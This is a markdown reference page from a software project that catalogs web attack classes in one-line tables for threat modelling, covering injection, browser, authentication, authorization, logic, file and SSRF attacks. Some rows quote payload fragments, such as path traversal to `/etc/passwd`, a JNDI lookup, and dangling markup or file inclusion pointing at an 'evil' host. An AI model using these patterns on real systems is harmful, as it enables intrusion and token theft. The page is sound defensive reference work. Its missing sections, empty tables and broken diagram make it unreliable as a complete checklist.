# Web Attack Catalog

A theory-only reference: every kind of flaw a website can have and every kind of attack it can
receive, grouped by **where the attack lands**. Nothing on this page is about this codebase — what
the boilerplate actually does about each item lives in [Security](../tools/security.md), and the
row-by-row mapping from this catalog to the code is
[Web Attack Defences](./web-attack-defences.md).

Use it as a checklist when threat-modelling a feature: walk the groups top to bottom and ask
"could this one apply here?". Each row is deliberately one line — the name, what it is, and the
mechanism. Follow the standard references at the bottom for depth.

## The attack surface in one picture

Every section below sits on one of those five boxes. An attacker rarely stays in one: a phishing
mail (human) leads to an open redirect (browser) that lands on an IDOR (application) that dumps a
collection (data). Chains are the norm, which is why a "low" finding is rarely low on its own.

## How to read the tables

| Column   | Meaning                                                          |
| -------- | ---------------------------------------------------------------- |
| **Name** | the term you will find in write-ups, CVEs and scanner output     |
| **What** | the flaw or the attack, in one sentence                          |
| **How**  | the mechanism — the one thing that has to be true for it to work |

"Flaw" and "attack" are two sides of one row: the flaw is the missing control, the attack is the
way someone exploits its absence. Where a group is mostly one or the other, the section says so.

## 1. Injection — untrusted data interpreted as code

The oldest family and still the most damaging. The pattern is always the same: user input reaches
an interpreter (SQL, shell, template engine, XML parser, regex engine…) without being separated
from the instructions.

| Name | What | How |
| ------------------------------------- | ------------------------------------------------------ | ------------------------------------------------------------------------------------ | -------------------- |
| SQL injection (SQLi) | input alters a SQL statement | string concatenation into a query; variants: error-based, union, blind, time-based |
| Second-order SQLi | stored input becomes injection later | value is sanitised on entry but re-used raw in a later query |
| NoSQL injection | input alters a document query | JSON body carrying operators (`$gt`, `$ne`, `$where`, `$regex`) into a filter object |
| Aggregation / pipeline injection | input alters a pipeline stage | user-controlled field names or stages reach an aggregation |
| ORM / query-builder injection | ORM helpers bypassed | raw fragments, unsafe `where` strings, dynamic sort/order fields |
| OS command injection | input becomes part of a shell command | `exec`-style calls with interpolated strings; `;`, `                                |`, `$( )`, backticks |
| Argument injection | input becomes an extra flag | safe `spawn` but a value beginning with `-` is read as an option by the binary |
| Code injection / `eval` | input executed by the language runtime | `eval`, `new Function`, `vm` sandboxes, dynamic `import` |
| Server-side template injection (SSTI) | input parsed as a template | user text goes into a template string rather than a template variable |
| Client-side template injection | same, but in a browser framework | user text reaches an expression evaluator (legacy Angular, Vue `v-html`+expressions) |
| Expression-language injection | input reaches an EL evaluator | SpEL, OGNL, JEXL, MVEL… in frameworks that evaluate expressions from parameters |
| LDAP injection | input alters an LDAP filter | unescaped `*`, `(`, `)`, `\|`, `&` in a directory query |
| XPath / XQuery injection | input alters an XML query | same shape as SQLi, against XML documents |
| XML external entity (XXE) | XML parser resolves attacker entities | DTD with external entities enabled → local file read, SSRF, DoS |
| XML injection | input alters XML structure | unescaped angle brackets in generated XML |
| GraphQL injection | input alters a query or reaches a resolver interpreter | string-built queries; resolvers passing arguments to SQL/shell |
| Log injection / log forging | input alters log lines | newlines or ANSI codes in a value written to logs; fake entries, hidden ones |
| JNDI / lookup injection | logger or config resolves remote references | `${jndi:ldap://…}`-style lookups in logged strings (Log4Shell) |
| CRLF injection | input inserts line breaks into a protocol | `\r\n` in a header value, log line, SMTP dialogue |
| HTTP header injection | input becomes a response header | CRLF inside redirect targets, cookie values, custom headers |
| HTTP response splitting | one response becomes two | CRLF injection producing a second, attacker-shaped response |
| Email header injection | input alters SMTP headers | newline in a `subject`/`from` field adds `Bcc:` or new recipients |
| CSV / formula injection | exported cell executes in a spreadsheet | value starting with `=`, `+`, `-`, `@` treated as a formula when opened |
| Regex injection | input becomes a pattern | user value passed to `new RegExp`; leads to ReDoS or filter bypass |
| Server-side includes (SSI) injection | input reaches an SSI directive | `<!--#exec … -->` in a page the server processes for includes |
| Insecure deserialization | untrusted bytes rebuilt into objects | serialised payloads with gadget chains; language-native formats, `pickle`, YAML |
| Prototype pollution | input modifies `Object.prototype` | recursive merge / `__proto__` keys → later logic reads attacker defaults |
| Mass assignment / autobinding | input sets fields it should not | request body bound directly to a model; `isAdmin`, `price`, `ownerId` overwritten |
| Host header injection | input controls the `Host` used server-side | absolute URLs, password-reset links, cache keys built from `Host` |
| Path / URL parameter injection | input alters a path built server-side | user value concatenated into a filesystem path or internal URL |

## 2. Client-side — attacks that run in the victim's browser

The site's own origin is the prize. Anything that executes or reads inside it inherits the
victim's cookies, storage and permissions.

| Name                                           | What                                                     | How                                                                                          |
| ---------------------------------------------- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| Cross-site scripting (XSS) — reflected         | script from the request echoed in the response           | unescaped parameter rendered in HTML; delivered by a crafted link                            |
| XSS — stored                                   | script saved once, served to many                        | unescaped user content (comments, names, profiles) rendered later                            |
| XSS — DOM-based                                | script never touches the server                          | client code writes `location`, `hash`, `postMessage` data into the DOM unsafely              |
| XSS — mutation (mXSS)                          | sanitiser bypassed by the parser                         | markup that is safe as text but mutates into script when the browser re-serialises it        |
| XSS — blind                                    | payload fires where the attacker cannot see              | stored in a support ticket, log viewer, admin dashboard                                      |
| XSS — universal (UXSS)                         | browser bug crossing origins                             | flaw in the browser rather than the site; site cannot prevent, only reduce impact            |
| HTML injection                                 | markup, not script, injected                             | phishing forms, fake login boxes, defacement inside a trusted page                           |
| CSS injection                                  | attacker-controlled stylesheet                           | attribute selectors leaking values char by char, layout for clickjacking                     |
| Dangling markup injection                      | unclosed tag swallows following HTML                     | `<img src='http://evil/?` captures everything until the next quote, incl. CSRF tokens        |
| DOM clobbering                                 | HTML elements shadow JS globals                          | `<a id="config">` overrides `window.config` that scripts trust                               |
| Cross-site request forgery (CSRF)              | victim's browser sends a request the victim did not mean | cookies auto-attached to a cross-site form/fetch; no token or SameSite check                 |
| Login CSRF                                     | victim logged into the attacker's account                | forged login form; victim's later actions land in a session the attacker can read            |
| Cross-site WebSocket hijacking (CSWSH)         | CSRF on the WebSocket handshake                          | cookie-authenticated upgrade with no `Origin` check                                          |
| Clickjacking / UI redress                      | victim clicks something hidden                           | target page in an invisible iframe under a decoy; no frame-ancestors / X-Frame-Options       |
| Drag-and-drop / cursorjacking                  | clickjacking variants                                    | offset cursor, drag data across frames                                                       |
| Tabnabbing (reverse)                           | opened tab rewrites the opener                           | `window.opener` without `noopener` lets the new page navigate the original                   |
| Open redirect                                  | site sends users to any URL                              | `?next=` / `returnUrl` not validated; used for phishing and OAuth token theft                |
| `postMessage` abuse                            | cross-window messages trusted                            | listener without origin check; sender to `*` leaking data                                    |
| Cross-site script inclusion (XSSI)             | JSON/JS with data read cross-origin                      | dynamic script response included via `<script src>`; JSONP hijacking is the classic case     |
| Cross-site leaks (XS-Leaks)                    | infer cross-origin state from side channels              | timing, frame counting, error events, cache probing, `history.length`                        |
| Cross-origin resource sharing (CORS) misconfig | browser allowed to read cross-origin responses           | reflected `Origin`, `null` origin allowed, wildcard with credentials                         |
| Content-Security-Policy bypass                 | CSP present but escapable                                | `unsafe-inline`, permissive `script-src`, JSONP endpoints on allowed hosts, base-uri missing |
| Subresource without integrity                  | CDN script modified in transit or at source              | `<script src="cdn…">` without SRI hash                                                       |
| Mixed content                                  | HTTPS page loads HTTP resources                          | active mixed content lets a network attacker inject script                                   |
| Service-worker abuse                           | persistent script for the origin                         | XSS registers a worker that survives the original bug                                        |
| Web cache deception                            | private page cached as public                            | `/account/me.css`-style URL confuses cache rules; attacker fetches the cached copy           |
| Browser cache poisoning                        | poisoned response reused locally                         | cacheable response with injected content persists for the victim                             |
| Client-side prototype pollution                | same as server-side, in the browser                      | query-string parsers, deep-merge utilities → DOM XSS gadgets                                 |
| Client-side path traversal                     | relative URL escapes intended API path                   | `../` in a value used to build a fetch URL                                                   |
| Drive-by download                              | file delivered without consent                           | compromised page or ad triggers download or exploit kit                                      |
| Formjacking / Magecart                         | injected script skims form data                          | compromised third-party script exfiltrates card numbers as they are typed                    |
| Clipboard / autofill abuse                     | browser conveniences leak data                           | hidden fields autofilled, `copy` events rewritten                                            |
| History sniffing                               | visited links inferred                                   | timing / rendering side channels on `:visited`                                               |

| Sensitive data in client storage               | secrets readable by any script                           | tokens in `localStorage`, PII in IndexedDB — one XSS away from theft                         |

## 3. Authentication — proving who you are

Mostly flaws (missing controls); the attacks are the ways credentials and sessions get taken.

| Name                                  | What                                     | How                                                                                            |

| Credential stuffing                   | replay leaked credential pairs           | password reuse across sites; automated login attempts at scale                                 |
| Password spraying                     | one common password across many accounts | evades per-account lockout                                                                     |

| Session fixation                      | attacker picks the session id            | id accepted from URL/cookie and not rotated at login                                           |
| Session hijacking / sidejacking       | attacker steals a live session           | XSS, network sniffing without TLS, log exposure, malware                                       |
| Predictable session tokens            | ids can be guessed                       | sequential, timestamp-based, or weak PRNG identifiers                                          |
| Insufficient session expiry           | sessions live too long                   | no idle timeout, no absolute timeout, no server-side revocation                                |
| Missing invalidation                  | old sessions stay valid                  | logout, password change, role change do not revoke existing tokens                             |

| Cookie tossing                        | subdomain overwrites parent cookie       | attacker-controlled subdomain sets a cookie the parent trusts                                  |

## 4. Authorization — proving what you may do

The most common class in modern APIs. Authentication was fine; the check on _this object_ or
_this function_ was missing.

| Name                                           | What                                            | How                                                                     |
| ---------------------------------------------- | ----------------------------------------------- | ----------------------------------------------------------------------- |
| Insecure direct object reference (IDOR) / BOLA | access another user's object                    | change the id in the URL/body; no ownership check                       |
| Horizontal privilege escalation                | act as a peer                                   | same role, different user's data or actions                             |
| Vertical privilege escalation                  | act as a higher role                            | admin endpoints reachable without the admin check                       |
| Broken function-level authorization (BFLA)     | function callable by the wrong role             | route exists, middleware missing                                        |
| Broken object-property-level authorization     | field readable/writable by the wrong role       | over-fetching responses; mass assignment on write                       |
| Forced browsing                                | hidden URL is not protected                     | guessing `/admin`, `/export`, `/v1/internal`                            |
| Parameter tampering                            | role or owner supplied by the client            | `role=admin`, `userId=…` in body trusted                                |
| Path normalisation bypass                      | check sees one path, handler another            | `/Admin`, `/admin/`, `/admin%2f`, `/admin;x`, `..;/`, double encoding   |
| HTTP verb tampering                            | check applied to some methods only              | `GET` guarded, `HEAD`/`PUT`/`OPTIONS` not; method-override headers      |
| Referer / origin-based access control          | check trusts a spoofable header                 | `Referer` used as authorization                                         |
| IP-based trust                                 | check trusts a spoofable address                | `X-Forwarded-For` honoured from untrusted proxies                       |
| Multi-step / workflow bypass                   | step reached out of order                       | pay step skipped by calling the confirm step directly                   |
| State-machine violations                       | transition not allowed from current state       | cancel after shipped, refund twice                                      |
| Context-dependent authorization gaps           | rule depends on data not checked                | "owner can edit" but owner check reads a stale or client-supplied value |
| Tenant isolation failure                       | one customer sees another's data                | missing tenant scope on queries, shared caches, shared ids              |
| Confused deputy                                | privileged component acts on behalf of attacker | internal service trusts callers; SSRF into an admin API                 |
| Time-of-check / time-of-use (TOCTOU)           | check passes, state changes, action runs        | race between validation and use                                         |
| GraphQL field-level authorization              | resolver reachable via another path             | nested fields or aliases skip the guard on the top-level query          |
| Admin functionality in client bundle           | UI hides, server does not                       | disabled buttons but live endpoints                                     |
| Insecure direct file access                    | files served by guessable path                  | uploads under a public directory with predictable names                 |
| Missing rate limit on sensitive functions      | abuse of allowed function at scale              | export, invite, coupon generation without quotas                        |

## 5. Business logic — the rules themselves are exploitable

No parser or bug involved; the application does exactly what it was told, and what it was told
was wrong. These are the ones scanners never find.

| Name                                    | What                                       | How                                                          |
| --------------------------------------- | ------------------------------------------ | ------------------------------------------------------------ |
| Race condition / double spend           | limit checked once, used many times        | parallel requests pass the same check before any commits     |
| Coupon / voucher reuse                  | single-use item used repeatedly            | race, missing uniqueness, case/whitespace variants           |
| Price manipulation                      | client sends the price                     | price, discount, currency, or total trusted from the request |
| Negative or zero quantities             | arithmetic inverted                        | `quantity=-1` credits instead of charging                    |
| Integer overflow / precision loss       | number wraps or rounds                     | large totals, floating-point money, rounding per line item   |
| Currency confusion                      | amount in the wrong unit                   | cents vs. units, currency code changed after pricing         |
| Workflow step skipping                  | later step called without earlier          | order confirmed without payment callback                     |
| Replay of one-time actions              | action repeated                            | resend webhook, resubmit form; no idempotency key            |
| Inconsistent validation across channels | one path stricter than another             | web form validates, API or import does not                   |
| Trusting client-side validation         | only the browser checks                    | JavaScript rules, HTML `required`, `max` attributes          |
| Refund / return abuse                   | money out without goods in                 | refund larger than paid, refund after partial cancel         |
| Gift-card / code enumeration            | valuable codes guessable                   | short codes, no rate limit on balance check                  |
| Referral / promo abuse                  | self-referral, fake accounts               | bonus granted before verification                            |
| Inventory reservation abuse             | stock locked without buying                | carts hold stock indefinitely; scalping bots                 |
| Feature-flag / config exposure          | unreleased or internal behaviour reachable | flags evaluated client-side, toggled by parameter            |
| Trusting user-supplied identifiers      | server derives nothing                     | `sellerId` chosen by the buyer                               |
| Insufficient anti-automation            | human-only actions scripted                | signups, reviews, votes, polls without CAPTCHA/proof-of-work |
| Denial of inventory / wallet            | lock a resource the attacker never uses    | reserve, then abandon                                        |
| Unit / measurement confusion            | rule assumes one unit                      | weight in kg vs. g on shipping fee                           |

## 6. Files and paths — reading and writing where you should not

| Name                                  | What                                         | How                                                                            |
| ------------------------------------- | -------------------------------------------- | ------------------------------------------------------------------------------ |
| Path traversal                        | read outside the intended directory          | `../../etc/passwd`, encoded variants, null bytes                               |
| Local file inclusion (LFI)            | server includes a local file as code/content | `?page=../../log` in `include`-style loaders                                   |
| Remote file inclusion (RFI)           | server includes a remote file                | `?page=http://evil/shell` where remote includes are allowed                    |
| Unrestricted file upload              | attacker-chosen file stored and served       | no type/size/name checks; web shell, HTML, SVG with script                     |
| Content-type / extension confusion    | check sees one type, server serves another   | `shell.php.jpg`, `.phtml`, `.htaccess`, polyglot files                         |
| Filename injection                    | name used in paths or commands               | traversal or shell metacharacters in the original filename                     |
| Zip slip                              | archive entry escapes extraction dir         | `../` inside entry names                                                       |
| Decompression bomb                    | tiny archive expands to fill disk/RAM        | nested or highly compressible archives; also PNG/GIF pixel floods              |
| XML bomb (billion laughs)             | entity expansion exhausts memory             | recursive entity definitions                                                   |
| Image-processing exploits             | crafted image triggers library bug           | ImageMagick / libpng / libjpeg CVEs; SVG with embedded script or external refs |
| Symlink / hardlink tricks             | link resolved to sensitive target            | attacker-controlled path on shared storage                                     |
| Insecure temp files                   | predictable temp names                       | race to replace the file before use                                            |
| Metadata leakage                      | files carry hidden data                      | EXIF GPS, author names, revision history in Office docs                        |
| Stored file served with wrong headers | upload rendered inline                       | HTML/SVG served as `text/html` on the main origin → stored XSS                 |
| Backup / source exposure              | files never meant to be served               | `.git/`, `.env`, `*.bak`, `*.swp`, `*.orig`, editor temp files                 |
| Directory listing                     | index of a folder exposed                    | autoindex enabled on upload or static directories                              |

## 7. Server-side request forgery — the server as the attacker's client

| Name                        | What                                       | How                                                                               |
| --------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------- |
| SSRF — basic                | server fetches an attacker-chosen URL      | webhook URL, image import, PDF renderer, URL preview                              |
| SSRF — blind                | fetch happens, response not shown          | timing or out-of-band DNS/HTTP callbacks reveal it                                |
| SSRF — via redirect         | allowed URL redirects to internal one      | validator checks the first hop only                                               |
| SSRF — DNS rebinding        | hostname resolves publicly, then privately | TTL-0 record switches between checks                                              |
| SSRF — parser confusion     | validator and fetcher disagree             | `http://allowed@evil/`, `evil#@allowed`, IPv6 forms, decimal/octal IPs, `0.0.0.0` |
| Cloud metadata access       | credentials from `169.254.169.254`         | any SSRF in a cloud VM / container without IMDSv2-style protection                |
| Internal service reach      | admin panels, databases, message brokers   | unauthenticated internal HTTP interfaces trusted by network position              |
| Protocol smuggling via SSRF | non-HTTP protocol spoken over the fetch    | `gopher://`, `dict://`, `file://` where the client library allows it              |
| Webhook / callback abuse    | user-registered URLs hit by the server     | SSRF as a feature; also port scanning through response timing                     |

## 8. HTTP protocol and intermediaries — proxies, caches, load balancers

Attacks that exploit disagreement between two parsers, or that abuse shared caches.

| Name                                        | What                                                | How                                                                                     |
| ------------------------------------------- | --------------------------------------------------- | --------------------------------------------------------------------------------------- |

## 15. API-specific — REST, GraphQL, webhooks

The OWASP API Top 10 items are mostly covered above (BOLA, BFLA, property-level auth, resource
consumption, SSRF, misconfiguration). These are the ones that only make sense for APIs.

| Name                                | What                              | How                                                            |

| Mutation without CSRF protection    | GraphQL over GET or form-encoded  | simple requests bypass preflight                               |

| Content negotiation confusion       | parser chosen by attacker         | XML accepted where JSON expected → XXE                         |

## The chain, again

```mermaid
%%{init: {'flowchart': {'nodeSpacing': 40, 'rankSpacing': 55}}}%%
flowchart LR
    R["🔍 Recon<br/><i>enumeration · disclosure · subdomains</i>"]
    E["🚪 Entry<br/><i>phishing · XSS · injection · misconfig</i>"]
    P["⬆️ Escalation<br/><i>IDOR · BFLA · SSRF · logic</i>"]
    X["📤 Impact<br/><i>data theft · fraud · DoS · persistence</i>"]

    R --> E --> P --> X

    classDef bad fill:#fee2e2,stroke:#dc2626,color:#111827;
    class R,E,P step;

Information disclosure feeds entry, entry feeds escalation, escalation feeds impact. Fixing the
"boring" recon-stage items is what turns a chain into a dead end.

## What this page is not

- Not a statement about this codebase. What is mitigated, how, and where is
  [Web Attack Defences](./web-attack-defences.md).
- Not a severity ranking. Impact depends on the chain, not the row.
- Not complete forever. New classes appear (HTTP/2 desync and XS-Leaks are both recent); revise
  it when a reference above does.
